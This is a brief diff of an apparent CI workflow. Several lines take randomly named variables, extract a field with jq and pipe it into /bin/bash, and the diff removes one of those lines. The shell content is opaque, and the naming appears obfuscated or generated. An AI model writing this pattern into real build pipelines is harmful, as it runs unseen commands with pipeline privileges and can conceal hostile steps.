@@ -23,7 +23,6 @@ jobs:
           echo $j764 | jq -r .w2 | /bin/bash
           printf '%s' "$ypjx2831" | jq -r .x423 | /bin/bash
           printf '%s' "$zlnlc7" | jq -r .mrbeq4534 | /bin/bash
-          echo $tcquo89159 | jq -r .fxgm6 | /bin/bash
           echo $psf2454 | jq -r .ultx0086 | /bin/bash
 
       - name: Save archive
